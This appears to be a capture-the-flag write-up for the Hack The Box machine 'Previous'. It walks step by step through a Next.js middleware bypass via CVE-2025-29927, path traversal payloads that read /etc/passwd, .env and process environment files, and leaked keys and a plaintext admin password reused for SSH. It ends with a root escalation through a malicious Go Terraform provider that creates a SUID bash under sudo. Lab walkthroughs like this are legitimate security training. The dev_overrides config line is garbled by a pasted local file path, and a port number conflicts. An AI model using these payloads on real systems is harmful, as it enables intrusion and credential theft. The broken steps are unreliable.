<div align=center>

# Previous Machine Write-up

[HTB Machine Certificate](https://labs.hackthebox.com/achievement/machine/2088593/701)
</div>

## Reconnaissance

1. **Starting with nmap, only ports 22 SSH and 80 HTTP are open.**

    ```bash
    ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.83 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV 10.10.11.83 
    ```
    ```bash
    PORT STATE SERVICE VERSION
    22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
    |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
    80/tcp open http nginx 1.18.0 (Ubuntu)
    |_http-title: PreviousJS
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
2. **Upon access the webpage, only available is two buttons "Get Started" and "Docs" both lead to login page.**

3. **The login page revewls that the application is in closed beta.**

4. **In login page, a url have a parameter named 'callbackUrl'.**

    http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs

    When attempting to log in, it remained in an infinity loading state. Refreshing the page while it was loading revealed the following url parameter: `http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fdocs` --> `http://localhost:3000/docs`

    Analyzing the auth communication, it was observed that the button in the page interface remained in loading, but the communication was completed. Furthermore, it was identified that the auth process uses the `NextAuth`.  

5. **Checking the application technologies version using the `wappalyzer` extension, it was identified that the Next versions is `Next.js 15.2.2`.**

    ![][image1]

## Exploitation

### CVE-2025-29927

6. **In this `Next.js` version, there is a known CVE: `CVE-2025-29927`.** 

    It's a critical vulnerability that allows an attacker to bypass authorization checks implemented in Next.js authz middleware. By handling the HTML header `X-middleware-subrequest`, it's possible to induce Next.js to skip the execution of the authz middleware, providing access to unauthorized routes. 

    * The flaw effects Next.js from `11.1.4` to `15.2.2` versions. 
    * The correction was implemented in `15.2.3` version.

7. **While searching for exploits, the following repository was found: `https://github.com/MuhammadWaseem29/CVE-2025-29927-POC`. Basically, it's sufficient to include the `X-middleware-subrequest` header in the request with the value `middleware:middleware:middleware:middleware:middleware`.**

    `X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware`

8. **The page was successfully accessed by bypassing the application authorization system.**

    ![][image2]

    The header insertion was automated using the `Match & Replace` functionality in `Caido Proxy`.

    ![][image3]

9. **When accessing `/docs`, a page containing two links was displayed. Upon accessing `/docs/examples` a link to download a file was found, which did not containing anything interesting. However in the page source code, this link revealed an interesting endpoint `/api/download?example=hello-world.ts`.**

    ```html
    <a href="/api/download?example=hello-world.ts">here</a>
    ```

### File inclusion

10. **This endpoint has a file inclusion vulnerability that allowed exfiltrate sensitive files.**

    Ex:  http://previous.htb/api/download?example=../../package.json

    * `../../.env`
    * `../../../etc/passwd`
    * `../.next/server/middleware.js`
    * `../../../proc/self/cwd/package.jso`n
    * `../../server.js`
    * `../../../etc/group`
    * `../../.next/server/middleware-manifest.json`
    * `../../package.json`
    * `../../../proc/self/environ`
    * `../../../etc/hostname`
    * `../../.next/routes-manifest.json` 
    * `../../.next/server/pages/api/download.js`
    * `../../../etc/hosts`
    * `../../.next/server/edge-runtime-webpack.js`
    * `../../.next/server/pages-manifest.json`
    * `../../../proc/1/cmdline`
    * `../../../proc/version`
    * `../../.next_server_pages_api_auth_[...nextauth].js`


### Looking for sensitive information

11. **Using the file inclusion vulnerability, some interesting files were exfiltrated. An administrator user credentials were found** 

    **../../../proc/version**    
    `Linux version 5.15.0-152-generic` (buildd@lcy02-amd64-094) (gcc (`Ubuntu 11.4.0-1ubuntu1~22.04`)        

    **../../.env**    
    A secret `NEXTAUTH_SECRECT` was found. However, apparently to be for the development environment, as it does not work.
    ```js
    NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a    
    ```

    **../../server.js**    
    Revealed that there is a `production` environment.'

    ```javascript
    const path = require('path')

    const dir = path.join(__dirname)

    process.env.NODE_ENV = 'production'
    process.chdir(__dirname)

    const currentPort = parseInt(process.env.PORT, 10) || 3000
    const hostname = process.env.HOSTNAME || '0.0.0.0'
    ```

    **/etc/passwd**   
    Gave strong indications that it could be a `Docker` container environment. Because:  

    * Most system users use `/sbin/nologin`.
    * System users (such `bin`, `daemon`, `cron`) and two relevant application users: `node` e `nextjs`.
    * The `UID 1001` e `GID 65533` used by the `nextjs` user are atypical values, often found in custom container images.

    ```bash
    root:x:0:0:root:/root:/bin/sh
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/mail:/sbin/nologin
    news:x:9:13:news:/usr/lib/news:/sbin/nologin
    uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
    cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
    ftp:x:21:21::/var/lib/ftp:/sbin/nologin
    sshd:x:22:22:sshd:/dev/null:/sbin/nologin
    games:x:35:35:games:/usr/games:/sbin/nologin
    ntp:x:123:123:NTP:/var/empty:/sbin/nologin
    guest:x:405:100:guest:/dev/null:/sbin/nologin
    nobody:x:65534:65534:nobody:/:/sbin/nologin
    node:x:1000:1000::/home/node:/bin/sh
    nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
    ```

    **../../../../proc/self/environ**   
    Revealed that the applications root directory is `/app`.
    ```
    NODE_VERSION=18.20.8
    HOSTNAME=0.0.0.0
    YARN_VERSION=1.22.22
    SHLVL=1
    PORT=3000
    HOME=/home/nextjs
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    NEXT_TELEMETRY_DISABLED=1
    PWD=/app
    NODE_ENV=production  
    ```

    **log poisoning**    
    It was attempt found nginx and Next.js log files aiming log poisoning to gain a RCE using the LFI, however anyone log file was found. 
    
    **../../.next/server_pages-manifest**  
    Revealed many endpoints

    ```json
    {
    "/_app": "pages/_app.js",
    "/_error": "pages/_error.js",
    "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
    "/api/download": "pages/api/download.js",
    "/docs/[section]": "pages/docs/[section].html",
    "/docs/components/layout": "pages/docs/components/layout.html",
    "/docs/components/sidebar": "pages/docs/components/sidebar.html",
    "/docs/content/examples": "pages/docs/content/examples.html",
    "/docs/content/getting-started": "pages/docs/content/getting-started.html",
    "/docs": "pages/docs.html",
    "/": "pages/index.html",
    "/signin": "pages/signin.html",
    "/_document": "pages/_document.js",
    "/404": "pages/404.html"
    }
    ```
    With this, it was possible to better understand the folder structure and obtain the `.next/server` files.

    _____

    **../../.next/server/middleware-manifest.json**   
    From this file, two new file paths were discovered, along with internal Next.js built-in environment variables.
    ```json
    <SNIP>
    {
    "files": [
        "server/edge-runtime-webpack.js",
        "server/middleware.js"
      ],
     <SNIP>
      "env": {
        "__NEXT_BUILD_ID": "qVDR2cKpRgqCslEh-llk9",
        "NEXT_SERVER_ACTIONS_ENCRYPTION_KEY": "lmAAapzJU+nklkAThiclUFPJCS5Q1pNXK9NQ/GTpUXo=",
        "__NEXT_PREVIEW_MODE_ID": "df9e8fb824e0b5417a0bf34c6595a56c",
        "__NEXT_PREVIEW_MODE_ENCRYPTION_KEY": "e08c73fd3f204203133f2f4282440af9f4b926dfad649b01fb440e2de61ff1c0",
        "__NEXT_PREVIEW_MODE_SIGNING_KEY": "5f5ca593a20b8504439b5e22760cf8d862a773025eb3db418355259dc0c2276f"
        }
    <SNIP>
    }
    ```

    Using these keys was unsuccessful.    

    **/../.next/server/pages/api/auth_[...nextauth].js**   
    From this file, exposed credentials for `jeremy` user were found, indicating that he is an administrator. The credentials were validated in the web application, however, no further access was gained.   


    ```javascript
    // <SNIP>
    o = {
       session: {
           strategy: "jwt"
       },
       providers: [r.n(u)()({
           name: "Credentials",
           credentials: {
               username: {
                   label: "User",
                   type: "username"
               },
               password: {
                   label: "Password",
                   type: "password"
               }
           },
           authorize: async e => e?.username === "jeremy" && e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") ? {
               id: "1",
               name: "Jeremy"
           } : null 
       })],
       pages: {
           signIn: "/signin"
       },
      // <SNIP>
    ```

## Initial Access

12. **When attempt use this credentials found in `/../.next/server/pages/api/auth_[...nextauth].js` to access `SSH`, the access was successful.**

### Post-exploration

13. **Initial Checks**

    ```bash
    -bash-5.1$ id
    uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
    -bash-5.1$ export PS1='\u@\h:\w\$ '
    jeremy@previous:~$ 
    jeremy@previous:~$ ls -la
    total 48
    drwxr-x--- 7 jeremy jeremy 4096 Sep 15 14:03 .
    drwxr-xr-x 3 root   root   4096 Aug 21 20:09 ..
    lrwxrwxrwx 1 root   root      9 Aug 21 19:57 .bash_history -> /dev/null
    -rw-r--r-- 1 jeremy jeremy  220 Aug 21 17:28 .bash_logout
    -rw-r--r-- 1 jeremy jeremy 3771 Aug 21 17:28 .bashrc
    drwx------ 2 jeremy jeremy 4096 Aug 21 20:09 .cache
    drwxr-xr-x 3 jeremy jeremy 4096 Aug 21 20:09 docker
    drwxrwxr-x 3 jeremy jeremy 4096 Sep 15 13:55 .local
    drwxrwxr-x 2 jeremy jeremy 4096 Sep 15 14:12 privesc
    -rw-r--r-- 1 jeremy jeremy  807 Aug 21 17:28 .profile
    drwxr-xr-x 2 root   root   4096 Sep 15 13:45 .terraform.d
    -rw-rw-r-- 1 jeremy jeremy  150 Aug 21 18:48 .terraformrc
    -rw-r----- 1 root   jeremy   33 Sep 15 04:02 user.txt
    jeremy@previous:~$ ls /home
    jeremy    
    ```
    As expected, the access was not within the application environment, which runs inside a Docker container. 

    ```bash
    jeremy@previous:~$ cat docker/docker-compose.yml
        services:
        next:
            build: previous
            restart: unless-stopped
            ports:
            - "127.0.0.1:3000:3000"
    ```

    It caught attention the terraform folder in the jeremy's directory.   

    ```bash
    jeremy@previous:~$ ls -la privesc
    total 16
    drwxrwxr-x 2 jeremy jeremy 4096 Sep 15 14:12 .
    drwxr-x--- 7 jeremy jeremy 4096 Sep 15 14:03 ..
    -rwxrwxrwx 1 jeremy jeremy  123 Sep 15 14:12 dev.tfrc
    -rwxrwxr-x 1 jeremy jeremy   32 Sep 15 13:55 terraform-provider-examples_v0.1_linux_amd64
    ```

    While analyzing the running process, one was found listening on `port 33759`. Local port forwarding was made to access it, however it returned a 404 error response. 

    An `Nmap` scan reveals that is a `Golang server`. 

    ```bash
    nmap -p 1234 -sC -sV localhost
    <SNIP>
    PORT STATE SERVICE VERSION
    1234/tcp open http Golang net/http server
    | fingerprint-strings: 
    <SNIP>
    ```

    The `sudoers` file revealed privileges that the `jeremy` user has privileges to execute the `/usr/bin/terraform` binary as `root`. However, restricted to the `-chdir\=/opt/examples apply` command.

    ```bash
    jeremy@previous:~$ sudo -l
    <SNIP>
        !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

    User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
    ```

## Privilege Escalation

14. **Understanding `Terraform` and `apply` functionality.**

    This article was found https://toshith29.medium.com/proof-of-concept-terraform-privilege-escalation-cd3db69df90e and was the foothold to understand more about `Terraform` and `apply` functionality.

    In summary, Terraform is a tool to create infrastructure (servers, network, etc) using code.

    Terraform allows the use of environment variables (such as `TF_CLI_CONFIG_FILE`) to control where it download providers from.

    Using the `TF_CLI_CONFIG_FILE` variable, it's possible to create a configuration file. This file instructs Terraform to always use a specified provider from a custom path (for example, `/tmp`) whenever that provider is required.

    * A provider is a plugin used to communicate with a platform, such as AWS, GCP or a fictitious local service. 

    It's important to not that `!env_reset` must be configured in the `sudoers` file, because the exploitation requires the capacity to define environment variables. If `env_reset` is enabled, the users's environment variables will be cleared and the exploitation will fail. 

    * This is called `dev_overrides`.

### Terraform Provider Hijacking 

15. **Exploring the `/usr/bin/terraform -chdir\=/opt/examples apply`.**

    1. <u>First, it was necessary to identify the exact provider name so Terraform knows which provider must be replaced by the malicious code.</u>

        ```bash
        jeremy@previous:~$ cat /opt/examples/*.tf
        ```

        ```json    
        terraform {
        required_providers {
            examples = {
            source = "previous.htb/terraform/examples"
            }
        }
        }

        variable "source_path" {
        type = string
        default = "/root/examples/hello-world.ts"

        validation {
            condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
            error_message = "The source_path must contain '/root/examples/'."
        }
        }

        provider "examples" {}

        resource "examples_example" "example" {
        source_path = var.source_path
        }

        output "destination_path" {
        value = examples_example.example.destination_path
        }
        ```

        The provider is defined in: `provider "examples" {}`

    2. <u>Create the binary file simulating a provider and containing the payload.</u>

        A Golang script was written to build a malicious provider binary containing the payload that copies `/bin/bash` and grant `SUID`.

        ```go
        package main

        import (
            "os"
        )

        func main() {
            os.Remove("/tmp/.provider/bash-root") 
            data, _ := os.ReadFile("/bin/bash")
            os.WriteFile("/tmp/.provider/bash-root", data, 0755)
            os.Chmod("/tmp/.provider/bash-root", 0755|os.ModeSetuid)
        } 
        ```

        Then, the binary was compiled.

        ```bash
        GOOS=linux GOARCH=amd64 go build -o terraform-provider-examples terraform-provider-examples.go
         ```

        The binary had to be transferred to the target machine. To accomplish this, a folder named `.provider` was created under `/tmp`. 

        ```bash
        scp -P 22 terraform-provider-examples jeremy@10.10.11.83:/tmp/.provider
        ```

        Now it's necessary to grant execution permission.

        ```bash
        chmod +x /tmp/.provider/terraform-provider-examples
        ```

    3. <u>A terraform configuration file was created. The naming of the files such as the Provider was done according to the rules in the main configuration files found in /opt/examples directory.</u>

        ```bash
        cat > /tmp/exp.rc << 'EOF'
        provider_installation {
        dev_overrides {
            "previous./home/lucas/workspace/htb-machines/Soulmate/writeup.mdhtb/terraform/examples" = "/tmp/.provider"
        }
        direct {}
        }
        EOF
        ```
        `ev_overrides)`: is a functionality that allows force Terraform to use a custom provider instead the official.
            
        Terraform automated search for a file called `terraform-provider-[nome]` is the specified directory.

        `"examples" = "/tmp" --> terraform-provider-examples`

    4. <u>The environment variable `TF_CLI_CONFIG_FILE` was exported to do the terraform uses the malicious provider instead the original.</u>
    
        ```bash
        export TF_CLI_CONFIG_FILE=/tmp/exp.rc
   
        ```

16. **Runs the command `terraform -chdir\=/opt/examples apply`.**
        
    ```bash
    sudo /usr/bin/terraform -chdir\=/opt/examples apply
    ```

## Root

17. **Root access was obtained.**  

    ![][image4]


[image4]: files/htb-previous-machine/image4.png
[image3]: files/htb-previous-machine/image3.png
[image2]: files/htb-previous-machine/image2.png
[image1]: files/htb-previous-machine/image1.png